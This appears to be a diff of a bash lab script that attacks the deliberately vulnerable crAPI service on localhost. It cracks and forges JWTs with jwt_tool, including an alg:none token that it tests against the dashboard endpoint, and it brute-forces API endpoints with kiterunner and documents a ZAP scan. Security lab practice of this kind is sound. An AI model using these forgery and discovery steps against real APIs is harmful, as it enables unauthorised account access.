@@ -12,7 +12,6 @@
 
 set -euo pipefail
 CRAPI="http://localhost:8888"
-MAILHOG="http://localhost:8025"
 
 echo ""
 echo "==========================================="
@@ -38,7 +37,7 @@ echo ""
 echo "=== STEP 1: Register test user & get JWT ==="
 REGISTER=$(curl -sf -X POST "$CRAPI/identity/api/auth/signup" \
   -H "Content-Type: application/json" \
-  -d '{"name":"JwtTest","email":"jwttest@lab.local","number":"1234567890","password":"Password1!"}')
+  -d '{"name":"JwtTest","email":"jwttest@lab.local","number":"1234567890","password":"Password1!"}' || true)
 echo "[*] Register response: $REGISTER"
 
 echo ""
@@ -52,6 +51,8 @@ TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).
 if [ -z "$TOKEN" ]; then
   echo "[!] Could not extract token — check login response above and set TOKEN manually:"
   echo "    export TOKEN=<paste_token_here>"
+  echo "    Then re-run from STEP 2 onwards."
+  exit 1
 else
   echo "[+] TOKEN extracted: ${TOKEN:0:50}..."
   export TOKEN
@@ -61,77 +62,129 @@ echo ""
 # ---------------------------------------------------------------------------
 # STEP 2 — jwt_tool: decode, crack, and alg:none attack
 #
-# Install:  pip3 install jwt_tool  (or: pipx install jwt_tool)
+# IMPORTANT: jwt_tool is NOT on PyPI — must clone from GitHub source.
+# Install:
+#   git clone https://github.com/ticarpi/jwt_tool.git /tmp/jwt_tool
+#   pip3 install -r /tmp/jwt_tool/requirements.txt --break-system-packages
+#   ln -sf /tmp/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool
+#   chmod +x /tmp/jwt_tool/jwt_tool.py
 # ---------------------------------------------------------------------------
 echo "=== STEP 2: jwt_tool exercises ==="
 
 if ! command -v jwt_tool &>/dev/null; then
-  echo "[!] jwt_tool not found. Installing..."
-  pip3 install jwt_tool --break-system-packages 2>/dev/null || pip3 install jwt_tool
+  echo "[!] jwt_tool not found. Installing from GitHub source..."
+  git clone https://github.com/ticarpi/jwt_tool.git /tmp/jwt_tool 2>/dev/null || \
+    echo "[*] /tmp/jwt_tool already exists, skipping clone"
+  pip3 install -r /tmp/jwt_tool/requirements.txt --break-system-packages 2>/dev/null || \
+    pip3 install -r /tmp/jwt_tool/requirements.txt
+  chmod +x /tmp/jwt_tool/jwt_tool.py
+  ln -sf /tmp/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool
+  echo "[+] jwt_tool installed"
 fi
 
 echo ""
-echo "--- 2a: Decode token (no verification) ---"
+echo "--- 2a: Decode token header + payload (RS256 — no secret needed) ---"
 jwt_tool "$TOKEN" 2>/dev/null || echo "[!] Run manually: jwt_tool \$TOKEN"
 
 echo ""
-echo "--- 2b: Crack secret (known: 'crapi') ---"
+echo "--- 2b: Crack secret (crAPI community service uses HS256 with secret 'crapi') ---"
 echo "crapi" > /tmp/jwt_wordlist.txt
 jwt_tool "$TOKEN" -C -d /tmp/jwt_wordlist.txt 2>/dev/null || \
-  echo "[!] Run manually: jwt_tool \$TOKEN -C -d /tmp/jwt_wordlist.txt"
+  echo "[*] Expected: crack fails — crAPI identity service uses RS256 (asymmetric), not HS256"
 
 echo ""
-echo "--- 2c: Forge token with known secret ---"
-jwt_tool "$TOKEN" -S hs256 -p "crapi" 2>/dev/null || \
-  echo "[!] Run manually: jwt_tool \$TOKEN -S hs256 -p 'crapi'"
-
-echo ""
-echo "--- 2d: alg:none attack (unsigned token) ---"
+echo "--- 2c: alg:none attack — forge an unsigned token ---"
+echo "[*] Generating unsigned token with alg:none..."
 jwt_tool "$TOKEN" -X a 2>/dev/null || \
   echo "[!] Run manually: jwt_tool \$TOKEN -X a"
 
+echo ""
+echo "--- 2d: TEST alg:none token against crAPI (CRITICAL finding) ---"
+echo "[*] Extracting unsigned token from jwt_tool output..."
+NONE_TOKEN=$(jwt_tool "$TOKEN" -X a 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' | head -1 || true)
+if [ -n "$NONE_TOKEN" ]; then
+  echo "[*] Sending alg:none token to /identity/api/v2/user/dashboard..."
+  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+    "$CRAPI/identity/api/v2/user/dashboard" \
+    -H "Authorization: Bearer $NONE_TOKEN")
+  echo "[*] HTTP status: $RESPONSE"
+  if [ "$RESPONSE" = "200" ]; then
+    echo "[!!!] CRITICAL: crAPI accepted unsigned token — alg:none attack CONFIRMED"
+  else
+    echo "[*] Status $RESPONSE — token rejected (expected 401)"
+  fi
+else
+  echo "[!] Could not extract alg:none token automatically."
+  echo "    Run: jwt_tool \$TOKEN -X a"
+  echo "    Copy the output token and run:"
+  echo "    curl -s -o /dev/null -w '%{http_code}' $CRAPI/identity/api/v2/user/dashboard -H 'Authorization: Bearer <alg_none_token>'"
+fi
 echo ""
 
 # ---------------------------------------------------------------------------
 # STEP 3 — kiterunner: API endpoint discovery
 #
-# Install:  brew install kiterunner
-#           OR: go install github.com/assetnote/kiterunner/cmd/kr@latest
+# IMPORTANT: kiterunner is NOT on Homebrew — must build from Go source.
+# Install:
+#   brew install go
+#   git clone https://github.com/assetnote/kiterunner.git /tmp/kiterunner
+#   cd /tmp/kiterunner && go build -o ~/bin/kr ./cmd/kiterunner/
+#   export PATH="$HOME/bin:$PATH"
 #
-# Wordlists: https://wordlists.assetnote.io/ — grab routes-large.kite
+# Wordlists (text format — use with 'brute' subcommand):
+#   curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt \
+#     -o ~/.kiterunner/api-seen-in-wild.txt
 # ---------------------------------------------------------------------------
 echo "=== STEP 3: kiterunner endpoint discovery ==="
 
 if ! command -v kr &>/dev/null; then
   echo "[!] kiterunner (kr) not found."
-  echo "    Install: brew install kiterunner"
-  echo "    Or:      go install github.com/assetnote/kiterunner/cmd/kr@latest"
+  echo "    Build from source:"
+  echo "      brew install go"
+  echo "      git clone https://github.com/assetnote/kiterunner.git /tmp/kiterunner"
+  echo "      cd /tmp/kiterunner && go build -o ~/bin/kr ./cmd/kiterunner/"
+  echo "      export PATH=\"\$HOME/bin:\$PATH\""
   echo ""
   echo "    Then re-run this section, or run manually:"
-  echo "    kr scan $CRAPI/identity -A=apiroutes-240528.kite --fail-status-codes 401,403,404 -o text"
+  echo "    kr brute $CRAPI -w ~/.kiterunner/api-seen-in-wild.txt --fail-status-codes 400,401,403,404,429,500 -o text"
   echo ""
 else
-  # Download wordlist if not present
-  WORDLIST="$HOME/.kiterunner/routes-small.kite"
+  # Use text wordlist with 'brute' subcommand (NOT 'scan' — scan is for .kite binary files only)
+  WORDLIST="$HOME/.kiterunner/api-seen-in-wild.txt"
   if [ ! -f "$WORDLIST" ]; then
-    echo "[*] Downloading routes-small.kite wordlist..."
+    echo "[*] Downloading api-seen-in-wild.txt wordlist from SecLists..."
     mkdir -p "$HOME/.kiterunner"
-    curl -L "https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite" \
-      -o "$WORDLIST" 2>/dev/null && echo "[+] Downloaded" || \
-      echo "[!] Download failed — try manually from https://wordlists.assetnote.io/"
+    curl -fsSL \
+      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt" \
+      -o "$WORDLIST" && echo "[+] Downloaded $WORDLIST" || \
+      echo "[!] Download failed — place a wordlist at $WORDLIST manually"
   fi
 
   if [ -f "$WORDLIST" ]; then
+    echo "[*] Scanning crAPI root..."
+    # NOTE: use 'brute' (not 'scan') for text wordlists
+    kr brute "$CRAPI" -w "$WORDLIST" \
+      --fail-status-codes 400,401,403,404,429,500 \
+      -o text 2>&1 | tee /tmp/kiterunner-root.txt
+    echo ""
     echo "[*] Scanning crAPI identity service..."
-    kr scan "$CRAPI/identity" -A="$WORDLIST" \
+    kr brute "$CRAPI/identity" -w "$WORDLIST" \
       --fail-status-codes 400,401,403,404,429,500 \
       -o text 2>&1 | tee /tmp/kiterunner-identity.txt
     echo ""
     echo "[*] Scanning crAPI community service..."
-    kr scan "$CRAPI/community" -A="$WORDLIST" \
+    kr brute "$CRAPI/community" -w "$WORDLIST" \
       --fail-status-codes 400,401,403,404,429,500 \
       -o text 2>&1 | tee /tmp/kiterunner-community.txt
-    echo "[+] Results saved to /tmp/kiterunner-identity.txt and /tmp/kiterunner-community.txt"
+    echo ""
+    echo "[*] Result summary:"
+    echo "    Root:      $(wc -l < /tmp/kiterunner-root.txt) lines"
+    echo "    Identity:  $(wc -l < /tmp/kiterunner-identity.txt) lines"
+    echo "    Community: $(wc -l < /tmp/kiterunner-community.txt) lines"
+    echo ""
+    echo "[*] NOTE: 0 hits does NOT mean no vulnerabilities. crAPI uses non-standard"
+    echo "    path structures (/identity/api/auth/login etc) that generic wordlists"
+    echo "    don't cover. Known vulnerabilities (alg:none, BOLA) exist regardless."
   fi
 fi
 echo ""
@@ -139,69 +192,68 @@ echo ""
 # ---------------------------------------------------------------------------
 # STEP 4 — ZAP API scan with crAPI OpenAPI spec
 #
-# Prerequisites:
-#   - OWASP ZAP installed (already on lab Mac)
-#   - crAPI OpenAPI spec extracted from container:
-#       docker cp $(docker ps -qf name=crapi-web-1):/app/resources/crapi-openapi-spec.json /tmp/crapi-openapi-spec.json
+# NOTE: crAPI does NOT expose its OpenAPI spec via HTTP (all common endpoints
+# return 404/401). The spec is bundled inside the container image only.
+# This step documents the approach and the blocked status.
 #
-# ZAP Docker alternative (no GUI needed):
-#   docker pull ghcr.io/zaproxy/zaproxy:stable
+# To extract the spec manually (if the container path changes):
+#   docker ps | grep crapi   # find the web container name
+#   docker cp <container>:/app/resources/ /tmp/crapi-resources/
 # ---------------------------------------------------------------------------
-echo "=== STEP 4: ZAP API scan with OpenAPI spec ==="
-
-echo "[*] Extracting OpenAPI spec from crAPI container..."
-CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -i "crapi.*web\|web.*crapi" | head -1 || true)
-if [ -z "$CONTAINER" ]; then
-  CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep "8888" | head -1 || \
-    docker ps -qf "publish=8888" 2>/dev/null | head -1 || true)
-fi
-
+echo "=== STEP 4: ZAP OpenAPI spec scan (BLOCKED — spec not HTTP-accessible) ==="
+echo ""
+echo "[*] Attempting to extract OpenAPI spec from crAPI container..."
+CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -i "crapi.*web\|web.*crapi\|crapi-web" | head -1 || true)
 if [ -n "$CONTAINER" ]; then
   docker cp "$CONTAINER:/app/resources/crapi-openapi-spec.json" /tmp/crapi-openapi-spec.json 2>/dev/null && \
-    echo "[+] OpenAPI spec saved to /tmp/crapi-openapi-spec.json" || \
-    echo "[!] Could not extract spec from $CONTAINER — try: docker ps (find crAPI web container name)"
+    echo "[+] Spec extracted to /tmp/crapi-openapi-spec.json" || \
+    echo "[!] Spec not found at /app/resources/crapi-openapi-spec.json in container $CONTAINER"
 else
-  echo "[!] Could not identify crAPI web container automatically."
-  echo "    Run: docker ps | grep crapi"
-  echo "    Then: docker cp <container_name>:/app/resources/crapi-openapi-spec.json /tmp/crapi-openapi-spec.json"
+  echo "[!] Could not identify crAPI web container. Run: docker ps | grep crapi"
 fi
 
 echo ""
-echo "[*] ZAP API scan command (run after spec is extracted):"
+echo "[*] ZAP Docker API scan command (run only if spec was extracted above):"
 echo ""
-echo "    # Option A — ZAP Docker (no GUI, recommended for automation):"
 echo "    docker run --rm --network host \\"
+echo "      -v /tmp:/zap/wrk:rw \\"
 echo "      ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \\"
-echo "      -t /tmp/crapi-openapi-spec.json \\"
+echo "      -t /zap/wrk/crapi-openapi-spec.json \\"
 echo "      -f openapi \\"
 echo "      -T 120 \\"
-echo "      -r /tmp/zap-api-report.html"
+echo "      -r /zap/wrk/zap-api-report.html"
 echo ""
-echo "    # Option B — ZAP installed locally (adjust path):"
-echo "    /Applications/ZAP.app/Contents/Java/zap-api-scan.py \\"
-echo "      -t $CRAPI/identity/api/openapi-docs \\"
-echo "      -f openapi \\"
-echo "      -r /tmp/zap-api-report.html"
-echo ""
-echo "    # Open report:"
 echo "    open /tmp/zap-api-report.html"
+echo ""
+echo "[!] KNOWN ISSUE: crAPI's OpenAPI spec is not accessible via HTTP."
+echo "    All standard spec endpoints (swagger.json, openapi.json, api-docs)"
+echo "    return 404 or 401. ZAP scan requires the spec file from the container."
 echo ""
 
 # ---------------------------------------------------------------------------
-# STEP 5 — BONUS: vAPI (additional vulnerable API target)
+# STEP 5 — vAPI (EXCLUDED — upstream PHP/MySQL migration bug)
 #
-# vAPI is a self-hosted vulnerable API (different from crAPI).
-# Source: https://github.com/roottusk/vapi
+# vAPI source: https://github.com/roottusk/vapi
+#
+# KNOWN BUG: vAPI's database seeder uses PHP 7.4 array numeric indices as
+# column names, which MySQL 8 rejects. Both 'migrate' and 'migrate:fresh --seed'
+# fail with: Unknown column '1' in 'field list'
+# This is an upstream bug — not fixable without patching the source.
+# Status: EXCLUDED from lab testing.
 # ---------------------------------------------------------------------------
-echo "=== STEP 5 (Bonus): vAPI setup ==="
+echo "=== STEP 5: vAPI (EXCLUDED — upstream PHP 7.4 / MySQL 8 migration bug) ==="
 echo ""
-echo "    git clone https://github.com/roottusk/vapi.git /tmp/vapi"
-echo "    cd /tmp/vapi"
-echo "    docker compose up -d"
-echo "    # vAPI runs on http://localhost:80"
-echo "    # Import the Postman collection from /tmp/vapi/postman/"
-echo "    # Run kiterunner against it:"
-echo "    kr scan http://localhost/vapi -A=$HOME/.kiterunner/routes-small.kite -o text"
+echo "[!] vAPI is excluded from this lab due to an upstream compatibility bug:"
+echo "    - PHP 7.4 array indices used as column names"
+echo "    - MySQL 8 rejects numeric column names"
+echo "    - Error: Unknown column '1' in 'field list' (flags seeder)"
+echo "    - Both 'migrate' and 'migrate:fresh --seed' fail"
+echo "    - Unfixable without patching vendor source"
+echo ""
+echo "    Workaround if needed:"
+echo "      git clone https://github.com/roottusk/vapi.git /tmp/vapi"
+echo "      # Patch /tmp/vapi/database/seeders/FlagSeeder.php"
+echo "      # Replace numeric array keys with named keys before running migrate"
 echo ""
 
 echo "==========================================="
